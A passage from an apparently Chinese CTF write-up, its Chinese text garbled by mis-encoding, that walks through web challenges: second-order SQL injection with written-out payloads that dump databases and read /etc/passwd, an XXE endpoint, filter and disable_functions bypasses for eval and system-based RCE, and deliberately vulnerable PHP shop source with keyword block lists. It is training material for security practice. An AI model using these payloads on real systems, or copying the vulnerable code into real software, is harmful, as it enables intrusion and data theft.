    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num&gt;0){
    $category = mysql_fetch_array($result)[&#39;category&#39;];
    $content = addslashes($_POST[&#39;content&#39;]);
    $sql = &quot;insert into comment
            set category = &#39;$category&#39;,
                content = &#39;$content&#39;,
                bo_id = &#39;$bo_id&#39;&quot;;#insert into comment set category = &#39;result&#39; bo_id=&#39;1\&#39;,content=&#39;&#39;,bo_id=&#39;xxx&#39;;
    $result = mysql_query($sql);
    }
    header(&quot;Location: ./comment.php?id=$bo_id&quot;);
    break;
default:
    header(&quot;Location: ./index.php&quot;);
}
}
else{
    header(&quot;Location: ./index.php&quot;);
}
?&gt;
</code></pre>
<p>éœ€è¦ç™»é™†æ‰èƒ½ç•™è¨€</p>
<p>çˆ†ç ´å¯çŸ¥: zhangwei / zhangwei666 (æˆ‘åäº†çˆ†ç ´åŠå¤©æ²¡å‡ºæ¥è¿˜æ˜¯è°·æ­Œçš„,è°çŸ¥é“åé¢æ˜¯å…¨æ•°å­—)</p>
<p>ä»£ç å®¡è®¡å‘ç°ç»å…¸çš„äºŒæ¬¡æ³¨å…¥å•Š</p>
<p>å› ä¸ºæ²¡æœ‰æŠ¥é”™æ‰€ä»¥ä¸çŸ¥é“è‡ªå·±çš„è¯­å¥æ˜¯å¦æ­£ç¡®å°±è°ƒäº†å¾ˆä¹…</p>
<p>ä»¤<code>catagory=&#39;\\&#39;</code>,</p>
<pre><code>content=%2Ccontent%3D0x6464646464%2Cbo_id%3D1%2F*&amp;bo_id=1*/%23
content=%2Ccontent%3D(SELECT+group_concat(schema_name)+FROM+information_schema.schemata)%2Cbo_id%3D1%2F*&amp;bo_id=1*/%23
</code></pre><p>å»æŠŠæ•°æ®åº“dumpä¸‹æ¥åå‘ç°æ²¡å•¥ä¸œè¥¿</p>
<p>æ¥ç€å»è¯•è¯•è¯»å–æ–‡ä»¶</p>
<p>å‘ç°å¯ä»¥è¯»å–æ–‡ä»¶</p>
<p>è¯»å–/etc/passwdå¾—åˆ°</p>
<pre><code>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/false
www:x:500:500:www:/home/www:/bin/bash</code></pre><p>å‘ç°åªæœ‰ä¸€ä¸ªå¯ä»¥ç™»é™†çš„ç”¨æˆ·:<code>www</code></p>
<p>æŸ¥çœ‹ä»–çš„<code>.bash_history</code></p>
<pre><code class="shell">cd /tmp/
unzip html.zip
rm -f html.zip
cp -r html /var/www/
cd /var/www/html/
rm -f .DS_Store
service apache2 start</code></pre>
<p>å‘ç°ä»–è¦åˆ é™¤<code>.DS_Store</code>é˜²æ­¢æˆ‘ä»¬çŸ¥é“ç›®å½•ç»“æ„,ä½†æ˜¯<code>/tmp</code>ç›®å½•æ˜¯æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶çš„,ä¹Ÿå°±æ˜¯æ‰€<code>/tmp/www</code>ä¸‹æœ‰<code>.DS_Store</code>æ–‡ä»¶,æ‹¿åˆ°æ–‡ä»¶è§£æåå¾—åˆ°flagæ–‡ä»¶å</p>
<pre><code>bootstrap
comment.php
css
flag_8946e1ff1ee3e40f.php
fonts
index.php
js
login.php
mysql.php
vendor
write_do.php</code></pre><h2 id="fakexml"><a href="#fakexml" class="headerlink" title="fakexml"></a>fakexml</h2><p>å­˜åœ¨xxe</p>
<pre><code class="php">&lt;?php
/**
* autor: c0ny1
* date: 2018-2-7
*/

$USERNAME = &#39;admin&#39;; //
$PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents(&#39;php://input&#39;);

try{
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);

    $username = $creds-&gt;username;
    $password = $creds-&gt;password;

    if($username == $USERNAME &amp;&amp; $password == $PASSWORD){
        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);
    }else{
        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);
    }    
}catch(Exception $e){
    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());
}

header(&#39;Content-Type: text/html; charset=utf-8&#39;);
echo $result;
?&gt;</code></pre>
<p>ç›´æ¥è¯»å–/flagå¾—åˆ°flag:<code>flag{663e8e72-be03-4533-a4cd-c44452942287}</code></p>
<h2 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h2><pre><code class="php">&lt;?php
error_reporting(0);
if(isset($_GET[&#39;code&#39;])){
            $code=$_GET[&#39;code&#39;];
                    if(strlen($code)&gt;40){
                                        die(&quot;This is too Long.&quot;);
                                                }
                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){
                                        die(&quot;NO.&quot;);
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?&gt;</code></pre>
<p>ä»£ç å¾ˆç®€å•,ä½†æ˜¯é™åˆ¶æœ‰ç‚¹éº»çƒ¦,æˆ‘ä»¬åˆ©ç”¨<code>~</code>æ¥ç»•è¿‡ä¸å…è®¸å­—æ¯å’Œæ•°å­—çš„é™åˆ¶</p>
<blockquote>
<p> å› ä¸ºæ˜¯ä¸€ä¸ªè¯­è¨€æ„é€ å™¨è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸èƒ½è¢« <a href="mk:@MSITStore:D:\ctf\æ‰‹å†Œ\php_manual_zh.chm::/res/functions.variable-functions.html">å¯å˜å‡½æ•°</a> è°ƒç”¨ã€‚ </p>
</blockquote>
<p>æ‰€ä»¥ä¸èƒ½ç›´æ¥<code>(~&quot;evalçš„~&quot;)(&quot;xxxxx&quot;)</code>,éƒ½æ²¡æ€»ç»“è¿™äº›å‘½ä»¤,å¯¼è‡´æˆ‘è¿‡äº†å¾ˆä¹…æ‰æƒ³èµ·assert</p>
<p>disable_function:</p>
<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</code></pre><p>è¦è¯»å–flagå¿…é¡»å‘½ä»¤æ‰§è¡Œ,ä½†æ˜¯æ ¹æ®phpinfo,ä»–ç¦ç”¨äº†system,execç­‰ç­‰ç”¨<code>https://github.com/mm0r1</code>è¿™ä¸ªå¤§ä½¬çš„è„šæœ¬æ¥ç»•è¿‡</p>
<p><code>flag{c7e5be35-729b-4bd0-aacd-c7a1eb98ddea}</code></p>
<h2 id="RCEService"><a href="#RCEService" class="headerlink" title="RCEService"></a>RCEService</h2><p>å…è®¸çš„å­—ç¬¦:<code>,:,a-z,{,}</code></p>
<p>é»‘åå•:<code>pwd,echo</code></p>
<p>åˆšå¼€å§‹ä»¥ä¸ºæ˜¯å‡çš„å‘½ä»¤æ‰§è¡Œ,çœ‹åˆ°æŠ¥é”™åå‘ç°è¿™æ˜¯çœŸçš„</p>
<pre><code class="php">Warning&lt;/b&gt;:  system() expects parameter 1 to be string, array given in &lt;b&gt;/var/www/html/index.php</code></pre>
<p>é‚£å…ˆæƒ³åŠæ³•è¯»å–index.php,æµ‹è¯•åå‘ç°æ˜¯ç”¨<code>$_REQUEST</code>æ¥æ¥å—æ•°æ®</p>
<p>åæ¥å®åœ¨æ²¡æƒ³æ³•å°±å»ç™¾åº¦äº†,çœ‹åˆ°çš„wpéƒ½æ˜¯æ¸…ä¸€è‰²çš„ç›´æ¥ç»™æºç ?????æ‚¨ä»¬æºç å“ªæ¥çš„</p>
<pre><code class="php">&lt;?php

putenv(&#39;PATH=/home/rceservice/jail&#39;);

if (isset($_REQUEST[&#39;cmd&#39;])) {
  $json = $_REQUEST[&#39;cmd&#39;];

  if (!is_string($json)) {
    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;
  } elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) {
    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;
  } else {
    echo &#39;Attempting to run command:&lt;br/&gt;&#39;;
    $cmd = json_decode($json, true)[&#39;cmd&#39;];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo &#39;Invalid input&#39;;
    }
    echo &#39;&lt;br/&gt;&lt;br/&gt;&#39;;
  }
}

?&gt;</code></pre>
<p>ç”¨æ¢è¡Œæ¥ç»•è¿‡preg_matchæˆ–è€…è¾“å…¥è¶³å¤Ÿé•¿çš„å­—ç¬¦æ¥ç»•è¿‡pregçš„å›æº¯æ¬¡æ•°</p>
<h2 id="CyberPunk"><a href="#CyberPunk" class="headerlink" title="CyberPunk"></a>CyberPunk</h2><pre><code class="php">&lt;?php

ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);

// $file = $_GET[&quot;file&quot;];
$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);
if (isset($file)){
    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {
        echo(&#39;no way!&#39;);
        exit;
    }
    @include($file);
}
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;index&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;
&lt;meta charset=&quot;utf-8&quot; /&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;h2&gt;2077å‘å”®äº†,ä¸æ¥ä»½å®ä½“å…¸è—ç‰ˆå—?&lt;/h2&gt;
        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-en.png&quot;&gt;&lt;!--LOGOLOGOLOGOLOGO--&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;h3&gt;æäº¤è®¢å•&lt;/h3&gt;
                &lt;form role=&quot;form&quot; action=&quot;./confirm.php&quot; method=&quot;post&quot; enctype=&quot;application/x-www-urlencoded&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;å§“å:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;ç”µè¯:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;h3&gt;åœ°å€:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;
                    &lt;/p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;æˆ‘æ­£æ˜¯é€é’±ä¹‹äºº&lt;/button&gt;
                &lt;/form&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;h2 class=&quot;mb&quot;&gt;è®¢å•ç®¡ç†&lt;/h2&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦æŸ¥è®¢å•&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦ä¿®æ”¹æ”¶è´§åœ°å€&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘ä¸æƒ³è¦äº†&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;!--?file=?--&gt;
</code></pre>
<p>search.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;; 

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);#æ—¥ç©¿
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        if(!$row) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;&lt;p&gt;å§“å:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, ç”µè¯:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, åœ°å€:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;
    } else {
        $msg = &quot;æœªæ‰¾åˆ°è®¢å•!&quot;;
    }
}else {
    $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;
}
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;æœç´¢&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
                &lt;h1&gt;è®¢å•æŸ¥è¯¢&lt;/h1&gt;
                &lt;form method=&quot;post&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;å§“å:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;ç”µè¯:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;/p&gt;
                    &lt;p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;æŸ¥è¯¢è®¢å•&lt;/button&gt;
                    &lt;/p&gt;
                &lt;/form&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
            &lt;h2 class=&quot;mb&quot;&gt;è®¢å•ç®¡ç†&lt;/h2&gt;
            &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;è¿”å›&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦ä¿®æ”¹æ”¶è´§åœ°å€&lt;/button&gt;
            &lt;/a&gt; 
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘ä¸æƒ³è¦äº†&lt;/button&gt;
            &lt;/a&gt;    
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>change.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;;

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $address = addslashes($_POST[&quot;address&quot;]);
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];
        $result = $db-&gt;query($sql);
        if(!$result) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;;
    } else {
        $msg = &quot;æœªæ‰¾åˆ°è®¢å•!&quot;;
    }
}else {
    $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;
}
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;ä¿®æ”¹æ”¶è´§åœ°å€&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
                &lt;h1&gt;ä¿®æ”¹æ”¶è´§åœ°å€&lt;/h1&gt;
                &lt;form method=&quot;post&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;å§“å:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;ç”µè¯:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;h3&gt;åœ°å€:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;
                    &lt;/p&gt;
                    &lt;p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;ä¿®æ”¹è®¢å•&lt;/button&gt;
                    &lt;/p&gt;
                &lt;/form&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
            &lt;h2 class=&quot;mb&quot;&gt;è®¢å•ç®¡ç†&lt;/h2&gt;
            &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;è¿”å›&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦æŸ¥è®¢å•&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./delete.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘ä¸æƒ³è¦äº†&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>delete.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;;

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        $result = $db-&gt;query(&#39;delete from `user` where `user_id`=&#39; . $row[&quot;user_id&quot;]);
        if(!$result) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;è®¢å•åˆ é™¤æˆåŠŸ&quot;;
    } else {
        $msg = &quot;æœªæ‰¾åˆ°è®¢å•!&quot;;
    }
}else {
    $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;
}
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;åˆ é™¤è®¢å•&lt;/title&gt;
&lt;base href=&quot;./&quot;&gt;
&lt;meta charset=&quot;utf-8&quot; /&gt;

&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;h&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;
                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;
                &lt;h1&gt;åˆ é™¤è®¢å•&lt;/h1&gt;
                &lt;form method=&quot;post&quot;&gt;
                    &lt;p&gt;
                    &lt;h3&gt;å§“å:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;
                    &lt;h3&gt;ç”µè¯:&lt;/h3&gt;
                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
                    &lt;/p&gt;
                    &lt;p&gt;
                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;åˆ é™¤è®¢å•&lt;/button&gt;
                    &lt;/p&gt;
                &lt;/form&gt;
                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot; style=&quot;color:#ffffff;&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;f&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;div class=&quot;row&quot;&gt;
            &lt;h2 class=&quot;mb&quot;&gt;è®¢å•ç®¡ç†&lt;/h2&gt;
            &lt;a href=&quot;./index.php&quot;&gt;
                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;è¿”å›&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./search.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦æŸ¥è®¢å•&lt;/button&gt;
            &lt;/a&gt;
            &lt;a href=&quot;./change.php&quot;&gt;
                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦ä¿®æ”¹æ”¶è´§åœ°å€&lt;/button&gt;
            &lt;/a&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>confirm.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;;
//var_dump($_POST);

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $address = $_POST[&quot;address&quot;];
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = &#39;no sql inject!&#39;;
    }else{
